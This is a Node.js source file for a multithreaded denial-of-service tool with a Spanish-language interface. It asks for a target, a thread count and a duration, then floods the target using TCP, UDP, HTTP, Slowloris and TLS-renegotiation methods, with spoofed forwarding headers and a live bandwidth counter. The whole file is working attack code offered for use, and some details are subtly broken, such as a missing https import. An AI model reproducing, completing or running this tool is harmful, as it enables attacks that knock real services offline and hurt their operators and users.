#!/usr/bin/env node
'use strict';

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');
const tls = require('tls');
const http = require('http');
const crypto = require('crypto');
const readline = require('readline');
const chalk = require('chalk');
const dns = require('dns/promises');
const url = require('url');

class DDoSApp {
    constructor() {
        this.stats = { requests: 0, success: 0, failed: 0, bandwidth: 0, sockets: 0 };
        this.workers = [];
        this.methods = new Map([
            ['TCP', this.tcpAttack],
            ['UDP', this.udpAttack],
            ['HTTP', this.httpAttack],
            ['SLOWLORIS', this.slowlorisAttack],
            ['SSL', this.sslAttack]
        ]);
        this.colors = {
            time: chalk.cyanBright,
            req: chalk.whiteBright,
            success: chalk.greenBright,
            fail: chalk.redBright,
            rps: chalk.yellowBright,
            bw: chalk.magentaBright,
            conn: chalk.blueBright
        };
    }

    async start() {
        const target = await this.getInput(chalk.greenBright('Objetivo (URL/IP): '));
        const { host, port, protocol } = await this.resolveTarget(target);
        const threads = await this.getNumber(chalk.greenBright('Hilos (500-5000): '), 500, 5000);
        const duration = await this.getNumber(chalk.greenBright('Duración (segundos): '), 60, 86400);
        const method = await this.selectMethod();

        this.startTime = Date.now();
        this.launchWorkers(host, port, threads, method, protocol);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    tcpAttack(host, port) {
        return new Promise(resolve => {
            const socket = net.connect(port, host, () => {
                const payload = crypto.randomBytes(1024);
                socket.write(payload, () => {
                    parentPort.postMessage({ 
                        requests: 1, 
                        success: 1, 
                        bandwidth: payload.length 
                    });
                    socket.end();
                    resolve();
                });
            }).on('error', () => {
                parentPort.postMessage({ requests: 1, failed: 1 });
                resolve();
            });
        });
    }

    udpAttack(host, port) {
        return new Promise(resolve => {
            const socket = dgram.createSocket('udp4');
            const payload = crypto.randomBytes(65507);
            socket.send(payload, port, host, (err) => {
                parentPort.postMessage({ 
                    requests: 1, 
                    success: err ? 0 : 1, 
                    failed: err ? 1 : 0, 
                    bandwidth: err ? 0 : payload.length 
                });
                socket.close();
                resolve();
            });
        });
    }

    httpAttack(host, port, protocol) {
        return new Promise(resolve => {
            const mod = protocol === 'https' ? https : http;
            const req = mod.get(`${protocol}://${host}:${port}`, {
                headers: {
                    'User-Agent': crypto.randomBytes(16).toString('hex'),
                    'X-Forwarded-For': `${crypto.randomInt(1,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(1,255)}`
                }
            }, () => {
                parentPort.postMessage({ requests: 1, success: 1 });
                resolve();
            }).on('error', () => {
                parentPort.postMessage({ requests: 1, failed: 1 });
                resolve();
            });
        });
    }

    slowlorisAttack(host, port) {
        return new Promise(resolve => {
            const socket = net.connect(port, host);
            parentPort.postMessage({ sockets: 1 });
            
            socket.write(`GET /${crypto.randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${host}\r\n`);
            const keepAlive = () => {
                socket.write(`X-a: ${crypto.randomBytes(4).toString('hex')}\r\n`);
                setTimeout(keepAlive, 15000);
            };
            keepAlive();
            
            socket.on('error', () => {
                parentPort.postMessage({ sockets: -1 });
                resolve();
            });
            resolve();
        });
    }

    sslAttack(host, port) {
        return new Promise(resolve => {
            const socket = tls.connect(port, host, {
                rejectUnauthorized: false,
                secureProtocol: 'TLS_method'
            }, () => {
                parentPort.postMessage({ requests: 1, success: 1, bandwidth: 512 });
                const interval = setInterval(() => {
                    socket.renegotiate({}, (err) => {
                        if(err) {
                            parentPort.postMessage({ requests: 1, failed: 1 });
                            clearInterval(interval);
                            resolve();
                        }
                    });
                }, 5000);
            }).on('error', () => {
                parentPort.postMessage({ requests: 1, failed: 1 });
                resolve();
            });
        });
    }

    launchWorkers(host, port, threads, method, protocol) {
        const cores = Math.min(require('os').cpus().length, 16);
        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: { 
                    host, 
                    port, 
                    method: method === 'ALL' ? [...this.methods.keys()] : [method],
                    protocol, 
                    intensity: Math.min(Math.ceil(threads / cores), 2000)
                }
            });
            worker.on('message', msg => this.updateStats(msg));
            this.workers.push(worker);
        }
    }

    updateStats(data) {
        this.stats.requests += data.requests || 0;
        this.stats.success += data.success || 0;
        this.stats.failed += data.failed || 0;
        this.stats.bandwidth += data.bandwidth || 0;
        this.stats.sockets += data.sockets || 0;
    }

    showStats() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const rps = (this.stats.requests / elapsed).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
        
        const statsLine = [
            this.colors.time(`[${elapsed.toFixed(1)}s]`),
            this.colors.req(`Peticiones: ${this.stats.requests}`),
            `${this.colors.success(this.stats.success)} éxitos`,
            `${this.colors.fail(this.stats.failed)} fallos`,
            this.colors.rps(`RPS: ${rps}`),
            this.colors.bw(`BW: ${bw}GB`),
            this.colors.conn(`Conexiones: ${this.stats.sockets}`)
        ].join(' ');

        process.stdout.write(`\r${statsLine}`);
        setTimeout(() => this.showStats(), 250);
    }

    async getInput(prompt) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise(resolve => {
            rl.question(prompt, answer => {
                rl.close();
                resolve(answer.trim());
            });
        });
    }

    async getNumber(prompt, min, max) {
        let value;
        do value = parseInt(await this.getInput(prompt)) || min;
        while (value < min || value > max);
        return value;
    }

    async selectMethod() {
        console.log(chalk.greenBright('\nMétodos disponibles:'));
        const methods = [...this.methods.keys(), 'ALL'];
        methods.forEach((m, i) => 
            console.log(chalk.hex('#00FF00')(` ${i + 1}. ${m}`)));
        
        const choice = await this.getNumber(chalk.greenBright('Seleccione método (1-6): '), 1, 6);
        return methods[choice - 1];
    }

    async resolveTarget(input) {
        try {
            if (!input.includes('://')) input = 'http://' + input;
            const parsed = new url.URL(input);
            const resolved = await dns.lookup(parsed.hostname);
            return {
                host: resolved.address,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                protocol: parsed.protocol.replace(':', '')
            };
        } catch (error) {
            console.log(chalk.redBright('\nError: Objetivo inválido'));
            process.exit(1);
        }
    }

    stop() {
        this.workers.forEach(w => w.terminate());
        console.log(chalk.greenBright('\nAtaque detenido'));
        process.exit();
    }
}

if (!isMainThread) {
    const { host, port, method, protocol, intensity } = workerData;
    const app = new DDoSApp();

    const attackCycle = async () => {
        try {
            const methodsToUse = Array.isArray(method) ? method : [method];
            const attackPromises = [];
            
            for (let i = 0; i < intensity; i++) {
                const selectedMethod = methodsToUse[Math.floor(Math.random() * methodsToUse.length)];
                attackPromises.push(app.methods.get(selectedMethod)(host, port, protocol));
            }
            
            await Promise.all(attackPromises);
            setTimeout(attackCycle, 50);
            
        } catch (error) {
            parentPort.postMessage({ error: error.message });
        }
    };

    attackCycle();
}

if (isMainThread) {
    new DDoSApp().start();
}